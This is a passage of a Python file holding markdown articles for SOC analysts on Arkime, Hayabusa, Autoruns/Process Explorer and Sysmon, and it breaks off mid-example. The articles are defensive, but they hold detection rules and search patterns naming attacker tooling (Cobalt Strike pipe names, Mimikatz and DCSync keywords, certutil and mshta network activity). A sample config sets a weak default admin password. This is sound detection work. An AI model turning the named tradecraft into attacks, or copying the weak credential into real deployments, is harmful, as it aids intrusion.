      - ARKIME_ELASTICSEARCH=http://127.0.0.1:9200
      - ARKIME_INTERFACE=eth0
      - ARKIME_ADMIN_PASSWORD=admin123
    ports:
      - "8005:8005"
```

### Configuration

```ini
# /opt/arkime/etc/config.ini (key settings)
[default]
elasticsearch=http://127.0.0.1:9200
interface=eth0
pcapDir=/opt/arkime/raw
maxFileSizeG=2
maxFileTimeM=30
freeSpaceG=5%
dbBulkSize=300000
packetThreads=2
compressES=false

# Enable protocol parsers
parsersDir=/opt/arkime/parsers

# SPI data fields (Session Profile Information)
plugins=wise.so;suricata.so

# GeoIP databases
geoLite2Country=/opt/arkime/etc/GeoLite2-Country.mmdb
geoLite2ASN=/opt/arkime/etc/GeoLite2-ASN.mmdb

# Packet filtering (BPF)
bpf=not port 9200 and not port 8005
```

## Core Usage

### Web Interface (Default: http://localhost:8005)

```
Sessions View:
  - Displays all captured sessions with metadata
  - Columns: Start Time, Source IP, Source Port, Dest IP, Dest Port,
    Packets, Bytes, Data Bytes, Protocol, Country, ASN

Session Detail:
  - Click any session to see decoded payload
  - View as ASCII, hex, raw, or image
  - Automatic protocol decoding (HTTP headers, DNS queries, etc.)
  - Download session as PCAP

SPI View:
  - Aggregated statistics by field
  - Top source IPs, destination IPs, protocols, countries
  - Useful for identifying anomalies in traffic patterns

Connections View:
  - Network graph showing communication relationships
  - Filter by protocol, bytes, or session count
```

### Search Query Language

```
# Basic field searches
ip.src == 10.1.2.50
ip.dst == 203.0.113.100
port.dst == 443
protocols == tls

# HTTP-specific searches
http.uri == "/admin/upload.php"
http.useragent == *PowerShell*
http.statuscode == 200
http.method == POST
http.host == evil-domain.xyz

# DNS searches
dns.host == *.evil-domain.xyz
dns.status == NXDOMAIN

# TLS/SSL searches
tls.ja3 == <ja3_hash>
cert.subject.cn == "*.evil-c2.xyz"
cert.issuer.cn == "Let's Encrypt"
cert.notAfter < "2025-01-01"

# Combination queries
ip.src == 10.1.2.50 && port.dst == 443 && tls.ja3 == abc123def456

# Country-based filtering
country.src == CN && bytes.dst > 1000000

# Time-based
starttime == "2025-03-15T14:00:00" && stoptime == "2025-03-15T15:00:00"

# Tag and hunt results
tags == critical-alert
```

### API Usage

```bash
# Search sessions via API
curl -u admin:password \
  "http://localhost:8005/api/sessions?date=-1&expression=ip.src%3D%3D10.1.2.50"

# Export PCAP for a specific session
curl -u admin:password \
  "http://localhost:8005/api/sessions/pcap?ids=SESSION_ID" -o session.pcap

# Get field statistics
curl -u admin:password \
  "http://localhost:8005/api/spiview?date=-1&expression=protocols%3D%3Dhttp&fields=http.host"
```

## Real Investigation Example

### Scenario: Investigating Data Exfiltration

```
Step 1: Identify high-volume outbound connections
  Query: ip.src == 10.0.0.0/8 && bytes.src > 50000000
  Sort by: Bytes descending
  Look for: Unusual destination IPs, non-standard ports

Step 2: Examine suspicious large transfers
  Query: ip.src == 10.1.2.50 && ip.dst == 198.51.100.25
  Review session payload for file content indicators

Step 3: Check DNS for domain resolution
  Query: dns.host == *.suspicious-domain.xyz && ip.src == 10.1.2.50
  Look for: DNS queries before the data transfer

Step 4: Export evidence
  Select sessions and export as PCAP for Wireshark analysis
  Tag sessions as "investigation-case-001" for future reference
```

### Scenario: Malware C2 Communication

```
Step 1: Search for known C2 JA3 fingerprint
  Query: tls.ja3 == <cobalt_strike_ja3_hash>

Step 2: Identify beaconing pattern
  Query: ip.dst == 185.141.25.168 && port.dst == 443
  Sort by time, look for regular intervals

Step 3: Extract beacon payload
  Open session detail, view decoded payload
  Export raw bytes for CyberChef analysis

Step 4: Pivot to find all affected hosts
  Query: ip.dst == 185.141.25.168
  Group by ip.src to see all communicating endpoints
```

## Integration with SOC Workflow

### WISE (With Intelligence See Everything)

```ini
# Configure WISE for threat intel enrichment
# /opt/arkime/etc/wise.ini
[file:ip]
file=/opt/arkime/etc/wise_ip.txt
tags=threat-intel
type=ip

# wise_ip.txt format (one per line):
# 203.0.113.50;tags=cobalt-strike,c2;priority=high
# 198.51.100.25;tags=apt29,exfil;priority=critical
```

### Suricata Integration

```ini
# In config.ini, enable Suricata plugin
plugins=wise.so;suricata.so

# Configure Suricata alerts overlay
[suricata]
alertFile=/var/log/suricata/eve.json
```

### PCAP Export to Analysts

```bash
# Export all sessions matching a query for the last 24 hours
curl -u admin:password \
  "http://localhost:8005/api/sessions/pcap?date=1&expression=tags%3D%3Dcase-001" \
  -o case-001-evidence.pcap

# Import into Wireshark for deep analysis
wireshark case-001-evidence.pcap
```

## Storage Planning

| Traffic Rate | Daily Storage | Monthly Storage | Recommended Setup |
|---|---|---|---|
| 100 Mbps | ~1 TB | ~30 TB | Single node, 8 TB NVMe |
| 1 Gbps | ~10 TB | ~300 TB | Multi-node cluster |
| 10 Gbps | ~100 TB | ~3 PB | Large cluster + tiered storage |

## Best Practices

1. **Plan storage carefully** - FPC generates enormous data volumes
2. **Use BPF filters** to exclude known-good high-volume traffic
3. **Tag important sessions** immediately during investigations
4. **Integrate with Suricata** for alert-enriched PCAP viewing
5. **Configure WISE** with your threat intelligence feeds
6. **Set retention policies** based on compliance and storage capacity
7. **Use the API** for automated queries from your SOAR platform

## Further Reading

- Arkime documentation: https://arkime.com/learn
- Arkime FAQ: https://arkime.com/faq
- Arkime GitHub: https://github.com/arkime/arkime
"""
    ))

    # -------------------------------------------------------------------------
    # 12. Hayabusa Windows Event Log Fast Forensics
    # -------------------------------------------------------------------------
    articles.append((
        "Hayabusa Windows Event Log Fast Forensics",
        ["tooling", "hayabusa", "windows", "event-logs", "sigma", "dfir", "detection"],
        r"""# Hayabusa Windows Event Log Fast Forensics

## Overview

Hayabusa is a Windows event log fast forensics timeline generator and threat hunting
tool created by the Yamato Security group. Written in Rust for maximum performance,
it processes Windows event logs using built-in detection rules (based on Sigma) and
generates detailed timelines. It is significantly faster than most alternatives and
supports both live analysis and offline EVTX processing.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Blazing speed | Processes millions of events in seconds |
| Sigma + custom rules | 4000+ built-in detection rules |
| Timeline generation | CSV timeline for forensic analysis |
| Live analysis | Run directly on endpoints |
| Metrics dashboard | Summary of detection hits by severity |
| Multi-format output | CSV, JSON, JSONL for different workflows |

**MITRE ATT&CK Relevance:** Hayabusa rules cover the full ATT&CK matrix for
Windows, including T1059 (Command Interpreters), T1053 (Scheduled Tasks),
T1547 (Autostart Execution), T1003 (Credential Dumping), T1021 (Remote Services),
T1070 (Indicator Removal).

## Installation

```powershell
# Download from GitHub releases
# https://github.com/Yamato-Security/hayabusa/releases

Invoke-WebRequest -Uri "https://github.com/Yamato-Security/hayabusa/releases/latest/download/hayabusa-win-x64.zip" -OutFile hayabusa.zip
Expand-Archive hayabusa.zip -DestinationPath C:\Tools\Hayabusa

# Download latest rules
cd C:\Tools\Hayabusa
.\hayabusa.exe update-rules
```

```bash
# Linux
wget https://github.com/Yamato-Security/hayabusa/releases/latest/download/hayabusa-lin-x64-musl.tar.gz
tar xzf hayabusa-lin-x64-musl.tar.gz
chmod +x hayabusa
./hayabusa update-rules
```

## Core Usage

### CSV Timeline Generation

```powershell
# Generate timeline from local event logs
.\hayabusa.exe csv-timeline -d C:\Windows\System32\winevt\Logs\ -o timeline.csv

# Generate timeline from collected EVTX files
.\hayabusa.exe csv-timeline -d E:\Evidence\Logs\ -o evidence_timeline.csv

# Filter by minimum alert level
.\hayabusa.exe csv-timeline -d E:\Evidence\Logs\ -o timeline.csv --min-level medium

# Filter by time range
.\hayabusa.exe csv-timeline -d E:\Evidence\Logs\ -o timeline.csv ^
  --timeline-start "2025-03-15 00:00:00" --timeline-end "2025-03-16 00:00:00"

# Include all field details (verbose)
.\hayabusa.exe csv-timeline -d E:\Evidence\Logs\ -o timeline.csv --profile super-verbose
```

### JSON Timeline

```powershell
# Generate JSON Lines timeline (for SIEM ingestion)
.\hayabusa.exe json-timeline -d E:\Evidence\Logs\ -o timeline.jsonl

# JSONL output is ideal for Elasticsearch bulk import
```

### Metrics Summary

```powershell
# Quick detection summary without full timeline
.\hayabusa.exe metrics -d E:\Evidence\Logs\

# Output example:
# Total events: 1,247,832
# Total detections: 342
#   Critical: 3
#   High: 27
#   Medium: 89
#   Low: 145
#   Informational: 78
#
# Top 10 detection rules:
#   1. Suspicious PowerShell Execution (45 hits)
#   2. New Service Creation (38 hits)
#   3. Logon with Explicit Credentials (31 hits)
```

### Pivot Keywords Search

```powershell
# Extract unique values for hunting (users, IPs, processes)
.\hayabusa.exe pivot-keywords-list -d E:\Evidence\Logs\ -o keywords.txt

# Output: Unique usernames, IP addresses, hostnames, process names
# Use these to pivot into other data sources
```

### Live Investigation

```powershell
# Run on a live system (analyze current event logs)
.\hayabusa.exe csv-timeline -l -o live_timeline.csv --min-level high

# Quick metrics on live system
.\hayabusa.exe metrics -l
```

## Output Profiles

| Profile | Fields | Best For |
|---|---|---|
| minimal | Timestamp, Computer, Channel, EventID, Level, RuleTitle | Quick overview |
| standard | + RuleFile, Details, ExtraFieldInfo | Default analysis |
| verbose | + AllFieldInfo, MitreAttack | Detailed investigation |
| super-verbose | + EvtxFile, RecordID, Provider | Deep forensics |
| timesketch-minimal | Timesketch-compatible format | Timesketch import |
| timesketch-verbose | Timesketch format + details | Timesketch deep dive |

## Real Investigation Example

### Scenario: Ransomware Incident Timeline

```powershell
# Step 1: Quick metrics to understand the scope
.\hayabusa.exe metrics -d E:\RansomwareCase\Logs\

# Step 2: Generate full timeline (high severity and above)
.\hayabusa.exe csv-timeline -d E:\RansomwareCase\Logs\ ^
  -o E:\RansomwareCase\Analysis\timeline.csv ^
  --min-level medium ^
  --profile super-verbose

# Step 3: Open in Timeline Explorer and filter
# Sort by timestamp, look for:
# - Initial access (4624 logon events, RDP, phishing)
# - Lateral movement (4624 Type 3/10, 4648, PsExec service)
# - Privilege escalation (4672, 4673, sensitive privilege use)
# - Credential access (LSASS access, DCSync indicators)
# - Ransomware deployment (service creation, scheduled tasks)
# - Defense evasion (log clearing, Defender tampering)

# Step 4: Extract pivot keywords
.\hayabusa.exe pivot-keywords-list -d E:\RansomwareCase\Logs\ -o keywords.txt
# Use extracted usernames and IPs to search other systems
```

### Scenario: Threat Hunting Across Fleet

```powershell
# Collect logs from multiple endpoints (via KAPE or admin shares)
# Then run Hayabusa against the combined evidence

# Scan all collected logs
.\hayabusa.exe csv-timeline -d E:\FleetLogs\ -o fleet_timeline.csv ^
  --min-level high --profile verbose

# Search for specific techniques
.\hayabusa.exe csv-timeline -d E:\FleetLogs\ -o fleet_timeline.csv ^
  --min-level informational | Select-String "DCSync|Mimikatz|Pass.the"
```

## Detection Rule Format

```yaml
# Hayabusa uses Sigma-compatible YAML rules
# Example custom rule:
title: Suspicious Scheduled Task Created via schtasks
id: custom-001
status: stable
level: high
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4698
        TaskContent|contains:
            - "powershell"
            - "cmd.exe /c"
            - "mshta"
            - "wscript"
            - "cscript"
    condition: selection
tags:
    - attack.persistence
    - attack.t1053.005
```

## Integration with SOC Workflow

### Automated Triage Script

```powershell
# hayabusa_triage.ps1
param([string]$EvidenceDir, [string]$OutputDir)

$hayabusa = "C:\Tools\Hayabusa\hayabusa.exe"
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

# Update rules
& $hayabusa update-rules

# Metrics summary
& $hayabusa metrics -d $EvidenceDir | Out-File "$OutputDir\metrics.txt"

# Full timeline
& $hayabusa csv-timeline -d $EvidenceDir -o "$OutputDir\timeline.csv" `
  --min-level low --profile super-verbose

# JSON for SIEM
& $hayabusa json-timeline -d $EvidenceDir -o "$OutputDir\timeline.jsonl"

# Pivot keywords
& $hayabusa pivot-keywords-list -d $EvidenceDir -o "$OutputDir\keywords.txt"

Write-Host "[+] Hayabusa analysis complete: $OutputDir" -ForegroundColor Green
```

### Ingest to Elasticsearch

```bash
# Bulk import JSONL to Elasticsearch
cat timeline.jsonl | while read -r line; do
  echo '{"index":{"_index":"hayabusa-timeline"}}'
  echo "$line"
done | curl -s -X POST "http://127.0.0.1:9200/_bulk" \
  -H "Content-Type: application/x-ndjson" --data-binary @-
```

## Hayabusa vs Chainsaw

| Feature | Hayabusa | Chainsaw |
|---|---|---|
| Language | Rust | Rust |
| Speed | Faster (optimized) | Fast |
| Rules | 4000+ built-in | Uses external Sigma |
| Timeline output | Native CSV/JSON | JSON/CSV |
| Metrics summary | Yes | No |
| Pivot keywords | Yes | No |
| Live analysis | Yes (-l flag) | No |
| Best for | Full forensic timeline | Quick Sigma scan |

## Best Practices

1. **Run update-rules** before every investigation for latest detections
2. **Start with metrics** to get a quick severity overview before full timeline
3. **Use super-verbose profile** for incident response cases
4. **Combine with KAPE** - use KAPE for collection, Hayabusa for analysis
5. **Import JSON into your SIEM** for correlation with other data sources
6. **Build custom rules** for your organization's specific threats
7. **Use pivot keywords** to expand your investigation scope

## Further Reading

- Hayabusa GitHub: https://github.com/Yamato-Security/hayabusa
- Hayabusa rules: https://github.com/Yamato-Security/hayabusa-rules
- Yamato Security blog: https://yamatosecurity.connpass.com/
"""
    ))

    # -------------------------------------------------------------------------
    # 13. Autoruns and Process Explorer for Persistence Hunting
    # -------------------------------------------------------------------------
    articles.append((
        "Autoruns and Process Explorer for Persistence Hunting",
        ["tooling", "autoruns", "process-explorer", "sysinternals", "persistence", "windows", "threat-hunting"],
        r"""# Autoruns and Process Explorer for Persistence Hunting

## Overview

Autoruns and Process Explorer are part of the Microsoft Sysinternals suite. Autoruns
provides the most comprehensive view of auto-starting locations on a Windows system,
while Process Explorer gives deep visibility into running processes. Together, they
form the primary toolkit for hunting persistence mechanisms and identifying suspicious
processes on live Windows endpoints.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Autoruns: 30+ persistence categories | Covers registry, services, drivers, WMI, tasks |
| VirusTotal integration | One-click hash checking for all entries |
| Process tree view | Visualize parent-child process relationships |
| DLL inspection | See loaded modules per process |
| Signature verification | Identify unsigned or tampered binaries |
| Offline analysis | Autoruns can analyze mounted hives |

**MITRE ATT&CK Relevance:** Directly detects T1547 (Boot/Logon Autostart Execution),
T1543 (Create or Modify System Process), T1053 (Scheduled Task), T1546 (Event
Triggered Execution), T1574 (Hijack Execution Flow), T1055 (Process Injection).

## Installation

```powershell
# Download Sysinternals Suite
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" `
  -OutFile SysinternalsSuite.zip
Expand-Archive SysinternalsSuite.zip -DestinationPath C:\Tools\Sysinternals

# Or download individual tools
Invoke-WebRequest "https://download.sysinternals.com/files/Autoruns.zip" -OutFile Autoruns.zip
Invoke-WebRequest "https://download.sysinternals.com/files/ProcessExplorer.zip" -OutFile ProcExp.zip

# Or use winget
winget install Microsoft.Sysinternals.Autoruns
winget install Microsoft.Sysinternals.ProcessExplorer

# Accept EULA silently (for automation)
reg add "HKCU\Software\Sysinternals\AutoRuns" /v EulaAccepted /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Sysinternals\Process Explorer" /v EulaAccepted /t REG_DWORD /d 1 /f
```

## Autoruns: Core Usage

### GUI Mode

```
1. Launch autoruns.exe (or autoruns64.exe) as Administrator
2. Wait for initial scan to complete
3. Key tabs to check:
   - Logon: Run/RunOnce keys, Startup folder
   - Explorer: Shell extensions, Browser Helper Objects
   - Scheduled Tasks: All scheduled tasks
   - Services: Windows services
   - Drivers: Kernel-mode drivers
   - WMI: WMI event subscriptions
   - Boot Execute: Boot-time programs
   - Image Hijacks: IFEO, .exe associations
   - AppInit DLLs: DLLs loaded into every process
   - Known DLLs: System DLL hijacking
   - Winlogon: Winlogon notification packages
   - Print Monitors: Print spooler extensions
   - LSA Providers: Security package DLLs
4. Enable Options > Scan Options > Check VirusTotal.com
5. Enable Options > Hide Microsoft Entries (focus on non-MS)
```

### Command Line (autorunsc.exe)

```powershell
# Full scan with VirusTotal checking, CSV output
autorunsc.exe -a * -c -h -s -v -vt -o C:\Output\autoruns.csv

# Flags explained:
#   -a *    All autostart locations
#   -c      CSV output
#   -h      Show file hashes
#   -s      Verify digital signatures
#   -v      Verify file exists
#   -vt     Check VirusTotal (requires internet)
#   -o      Output file

# Scan only specific categories
autorunsc.exe -a blt -c -h -s -o autoruns_boot_logon_tasks.csv
# Categories: b=boot, l=logon, t=tasks, s=services, d=drivers, w=wmi

# Compare two autoruns snapshots (baseline vs current)
autorunsc.exe -a * -c -h -s -o baseline.csv     # Take baseline
autorunsc.exe -a * -c -h -s -o current.csv      # Take current
# Compare using diff tool or PowerShell:
$baseline = Import-Csv baseline.csv
$current = Import-Csv current.csv
Compare-Object $baseline $current -Property "Image Path" -PassThru |
  Where-Object { $_.SideIndicator -eq "=>" }
```

### Offline Analysis

```powershell
# Analyze mounted registry hives (from forensic image)
autoruns.exe -a * -z E:\MountedImage\Windows\System32\config\SYSTEM ^
  E:\MountedImage\Users\suspect\NTUSER.DAT

# Or via command line
autorunsc.exe -a * -c -z E:\MountedImage\Windows\System32\config\SYSTEM ^
  E:\MountedImage\Users\suspect\NTUSER.DAT -o offline_autoruns.csv
```

## Process Explorer: Core Usage

### Key Features

```
1. Launch procexp.exe (or procexp64.exe) as Administrator
2. Enable lower pane: View > Show Lower Pane
3. Set lower pane to DLLs: View > Lower Pane View > DLLs

Key columns to add (View > Select Columns):
  - Verified Signer
  - Company Name
  - Image Path
  - Command Line
  - Parent PID
  - User Name

Color coding:
  - Purple: Packed/encrypted image (suspicious)
  - Red: Process exiting
  - Green: Process just started
  - Pink: Services
  - Blue: Your own processes
```

### Hunting with Process Explorer

```
Suspicious indicators to look for:

1. UNSIGNED PROCESSES
   Options > Verify Image Signatures
   Look for entries where "Verified Signer" is blank or "(Not Verified)"

2. PROCESS TREE ANOMALIES
   - svchost.exe not a child of services.exe
   - cmd.exe/powershell.exe spawned by unusual parents
   - explorer.exe with wrong parent
   - Multiple instances of lsass.exe

3. PROCESS NAME MASQUERADING
   - svch0st.exe (zero instead of 'o')
   - csrss.exe running from wrong directory
   - System processes not in System32

4. SUSPICIOUS DLLs
   Select process > Lower pane shows DLLs
   Look for unsigned DLLs, DLLs from Temp directories

5. NETWORK CONNECTIONS
   Right-click process > Properties > TCP/IP tab
   Identify processes with unexpected network activity
```

### VirusTotal Integration

```powershell
# In Process Explorer:
# Options > VirusTotal.com > Check VirusTotal.com
# A new "VirusTotal" column appears showing detection ratios

# In Autoruns:
# Options > Scan Options > Check VirusTotal.com
# Shows detection ratio next to each entry
```

## Real Investigation Example

### Scenario: Finding Malware Persistence

```powershell
# Step 1: Run Autoruns with VirusTotal check
autorunsc.exe -a * -c -h -s -vt -o autoruns_scan.csv

# Step 2: Filter for suspicious entries
Import-Csv autoruns_scan.csv | Where-Object {
    $_."Signer" -eq "" -or
    $_."VirusTotal" -match "[1-9]/" -or
    $_."Image Path" -match "\\Temp\\|\\AppData\\Local\\Temp"
} | Format-Table "Entry Location", "Image Path", "Signer", "VirusTotal" -AutoSize

# Step 3: Check specific persistence locations
Import-Csv autoruns_scan.csv | Where-Object {
    $_."Entry Location" -match "Run|RunOnce|Services|Tasks|WMI"
} | Where-Object { $_."Signer" -ne "(Verified) Microsoft" }

# Step 4: Investigate suspicious process with Process Explorer
# Right-click suspicious process > Properties
# Check: Image path, command line, strings, DLLs, TCP/IP connections
```

### Scenario: Baseline Comparison

```powershell
# Establish a clean baseline
autorunsc.exe -a * -c -h -s -o C:\Baselines\ws042_baseline.csv

# After suspected compromise, take new snapshot
autorunsc.exe -a * -c -h -s -o C:\Triage\ws042_current.csv

# Compare
$baseline = Import-Csv C:\Baselines\ws042_baseline.csv
$current = Import-Csv C:\Triage\ws042_current.csv

$new_entries = Compare-Object $baseline $current -Property "Image Path","Entry Location" -PassThru |
  Where-Object { $_.SideIndicator -eq "=>" }

$new_entries | Format-Table "Entry Location","Entry","Image Path","Launch String" -AutoSize
```

## Persistence Locations Reference

| Category | ATT&CK Technique | Registry/Path |
|---|---|---|
| Run Keys | T1547.001 | HKLM/HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run |
| RunOnce | T1547.001 | HKLM/HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce |
| Services | T1543.003 | HKLM\SYSTEM\CurrentControlSet\Services |
| Scheduled Tasks | T1053.005 | C:\Windows\System32\Tasks\ |
| Startup Folder | T1547.001 | %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup |
| WMI Events | T1546.003 | root\subscription namespace |
| AppInit DLLs | T1546.010 | HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows |
| IFEO | T1546.012 | HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options |
| Print Monitors | T1547.010 | HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors |
| LSA Packages | T1547.002 | HKLM\SYSTEM\CurrentControlSet\Control\Lsa |
| Boot Execute | T1547.012 | HKLM\SYSTEM\CurrentControlSet\Control\Session Manager |

## Integration with SOC Workflow

### Remote Autoruns Collection

```powershell
# Run Autoruns remotely via PsExec
PsExec.exe \\TARGET -s -c autorunsc.exe -a * -c -h -s -o \\FileServer\Triage\target_autoruns.csv

# Or via PowerShell remoting
Invoke-Command -ComputerName TARGET -ScriptBlock {
    & "C:\Tools\autorunsc.exe" -a * -c -h -s
} | Out-File "\\FileServer\Triage\target_autoruns.csv"
```

### Scheduled Baseline Collection

```powershell
# Collect weekly baselines across fleet
$computers = Get-ADComputer -Filter * -SearchBase "OU=Workstations,DC=corp,DC=local"
foreach ($computer in $computers.Name) {
    $output = "\\FileServer\Baselines\$computer-$(Get-Date -Format yyyyMMdd).csv"
    Start-Job { PsExec.exe \\$using:computer -s autorunsc.exe -a * -c -h -s -o $using:output }
}
```

## Best Practices

1. **Run as Administrator** - many persistence locations require elevated access
2. **Hide Microsoft entries** first to focus on third-party/malicious entries
3. **Enable VirusTotal** checking for automatic reputation analysis
4. **Take regular baselines** and compare after incidents
5. **Check the process tree** in Process Explorer - wrong parents indicate injection
6. **Verify signatures** - unsigned system processes are highly suspicious
7. **Use offline analysis** for forensic images where live access is not possible

## Further Reading

- Sysinternals documentation: https://learn.microsoft.com/en-us/sysinternals/
- Mark Russinovich's blog: https://techcommunity.microsoft.com/
- SANS Hunt Evil poster: https://www.sans.org/posters/hunt-evil/
"""
    ))

    # -------------------------------------------------------------------------
    # 14. Sysmon Advanced Configuration for Detection
    # -------------------------------------------------------------------------
    articles.append((
        "Sysmon Advanced Configuration for Detection",
        ["tooling", "sysmon", "windows", "detection", "endpoint", "logging", "edr"],
        r"""# Sysmon Advanced Configuration for Detection

## Overview

System Monitor (Sysmon) is a Windows system service and device driver from
Sysinternals that logs detailed system activity to the Windows Event Log. It records
process creation with full command lines, network connections, file creation time
changes, driver/DLL loading, raw disk access, and more. Sysmon is the foundation
of many endpoint detection strategies and is essentially a free, lightweight EDR sensor.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Process creation logging | Full command lines with parent process |
| Network connection tracking | Which process connected where |
| File hash logging | Automatic MD5/SHA256 of new executables |
| DLL loading | Detect DLL sideloading and injection |
| Named pipe monitoring | Detect C2 and lateral movement tools |
| WMI event logging | Catch WMI-based persistence |
| Clipboard monitoring | Detect credential harvesting |
| DNS query logging | Per-process DNS resolution tracking |

**MITRE ATT&CK Relevance:** Sysmon provides detection data for T1059 (Command
Interpreters), T1055 (Process Injection), T1021 (Remote Services), T1547
(Autostart Execution), T1003 (Credential Dumping), T1071 (Application Layer
Protocol), T1574 (Hijack Execution Flow).

## Installation

```powershell
# Download Sysmon
Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile Sysmon.zip
Expand-Archive Sysmon.zip -DestinationPath C:\Tools\Sysmon

# Install with default config (basic logging)
sysmon64.exe -accepteula -i

# Install with a community config (recommended)
sysmon64.exe -accepteula -i sysmonconfig.xml

# Update configuration
sysmon64.exe -c sysmonconfig.xml

# Check current configuration
sysmon64.exe -c

# Uninstall
sysmon64.exe -u
```

### Recommended Community Configs

```powershell
# SwiftOnSecurity config (most popular, balanced)
Invoke-WebRequest "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
  -OutFile sysmonconfig-swift.xml

# Olaf Hartong's modular config (highly detailed)
git clone https://github.com/olafhartong/sysmon-modular.git

# ION-Storm config (high visibility)
Invoke-WebRequest "https://raw.githubusercontent.com/ion-storm/sysmon-config/master/sysmonconfig-export.xml" `
  -OutFile sysmonconfig-ion.xml
```

## Sysmon Event IDs

| Event ID | Name | Description |
|---|---|---|
| 1 | ProcessCreate | Process creation with command line, hashes, parent |
| 2 | FileCreateTime | File creation time changed (timestomping) |
| 3 | NetworkConnect | Network connection with process details |
| 5 | ProcessTerminate | Process ended |
| 6 | DriverLoad | Driver loaded (signed/unsigned) |
| 7 | ImageLoad | DLL loaded into a process |
| 8 | CreateRemoteThread | Thread created in another process (injection) |
| 9 | RawAccessRead | Raw disk read (e.g., credential dumping) |
| 10 | ProcessAccess | Process opened another process (e.g., LSASS access) |
| 11 | FileCreate | File created or overwritten |
| 12 | RegistryEvent (Create/Delete) | Registry key/value created or deleted |
| 13 | RegistryEvent (Set) | Registry value set |
| 14 | RegistryEvent (Rename) | Registry key/value renamed |
| 15 | FileCreateStreamHash | Alternate data stream created |
| 17 | PipeEvent (Create) | Named pipe created |
| 18 | PipeEvent (Connect) | Named pipe connection |
| 22 | DNSEvent | DNS query with process information |
| 23 | FileDelete | File deleted (with archive option) |
| 24 | ClipboardChange | Clipboard content changed |
| 25 | ProcessTampering | Process image replaced (hollowing) |
| 26 | FileDeleteDetected | File deletion logged (no archive) |
| 27 | FileBlockExecutable | Executable file blocked |
| 28 | FileBlockShredding | File shredding blocked |
| 29 | FileExecutableDetected | Executable file detected |

## Configuration Deep Dive

### Configuration Structure

```xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
  <DnsLookup>False</DnsLookup>
  <CheckRevocation>False</CheckRevocation>

  <EventFiltering>
    <!-- Process Creation -->
    <RuleGroup name="ProcessCreate" groupRelation="or">
      <ProcessCreate onmatch="exclude">
        <!-- Exclude noisy legitimate processes -->
        <Image condition="is">C:\Windows\System32\svchost.exe</Image>
        <ParentImage condition="is">C:\Windows\System32\services.exe</ParentImage>
      </ProcessCreate>
    </RuleGroup>

    <!-- Network Connections -->
    <RuleGroup name="NetworkConnect" groupRelation="or">
      <NetworkConnect onmatch="include">
        <!-- Log connections from suspicious processes -->
        <Image condition="contains any">powershell;cmd;wscript;cscript;mshta;certutil</Image>
      </NetworkConnect>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

### High-Value Detection Rules

```xml
<!-- Detect LSASS access (credential dumping) - Event ID 10 -->
<RuleGroup name="ProcessAccess" groupRelation="or">
  <ProcessAccess onmatch="include">
    <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
  </ProcessAccess>
</RuleGroup>

<!-- Detect CreateRemoteThread (process injection) - Event ID 8 -->
<RuleGroup name="CreateRemoteThread" groupRelation="or">
  <CreateRemoteThread onmatch="exclude">
    <!-- Exclude known legitimate remote thread creators -->
    <SourceImage condition="is">C:\Windows\System32\csrss.exe</SourceImage>
    <SourceImage condition="is">C:\Windows\System32\wininit.exe</SourceImage>
    <SourceImage condition="is">C:\Windows\System32\winlogon.exe</SourceImage>
  </CreateRemoteThread>
</RuleGroup>

<!-- Detect Named Pipe indicators (C2, lateral movement) - Event ID 17/18 -->
<RuleGroup name="PipeEvent" groupRelation="or">
  <PipeEvent onmatch="include">
    <PipeName condition="contains any">MSSE-;msagent_;postex_;status_</PipeName>
    <PipeName condition="contains any">psexec;csexec;svcctl</PipeName>
  </PipeEvent>
</RuleGroup>

<!-- Detect DLL loading from suspicious paths - Event ID 7 -->
<RuleGroup name="ImageLoad" groupRelation="or">
  <ImageLoad onmatch="include">
    <ImageLoaded condition="contains any">\Temp\;\Downloads\;\AppData\Local\Temp</ImageLoaded>
    <Signed condition="is">false</Signed>
  </ImageLoad>
</RuleGroup>

<!-- Detect DNS queries for known bad domains - Event ID 22 -->
<RuleGroup name="DnsQuery" groupRelation="or">
  <DnsQuery onmatch="include">
    <QueryName condition="contains any">.xyz;.top;.club;.buzz;pastebin.com</QueryName>
  </DnsQuery>
</RuleGroup>
```

## Real Investigation Example

### Scenario: Detecting Cobalt Strike via Sysmon

```powershell
# Event ID 1: Suspicious process creation
# Look for encoded PowerShell
Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; Id=1} |
  Where-Object { $_.Message -match "powershell.*-enc|-encodedcommand" } |
  Select-Object TimeCreated, @{N="CommandLine";E={($_.Message -split "`n" | Where-Object {$_ -match "CommandLine:"}) -replace "CommandLine: ",""}}

# Event ID 10: LSASS access (credential dumping)
Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; Id=10} |
  Where-Object { $_.Message -match "lsass\.exe" } |
  Select-Object TimeCreated, @{N="Source";E={($_.Message -split "`n" | Where-Object {$_ -match "SourceImage:"}) -replace "SourceImage: ",""}}

# Event ID 3: Beacon network connections
Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; Id=3} |
  Where-Object { $_.Message -match "DestinationPort: (443|80|8080)" } |
  Select-Object TimeCreated, @{N="Process";E={($_.Message -split "`n" | Where-Object {$_ -match "Image:"}) -replace "Image: ",""}},
  @{N="DestIP";E={($_.Message -split "`n" | Where-Object {$_ -match "DestinationIp:"}) -replace "DestinationIp: ",""}}

# Event ID 17: Named pipe creation (Cobalt Strike indicators)
Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; Id=17} |
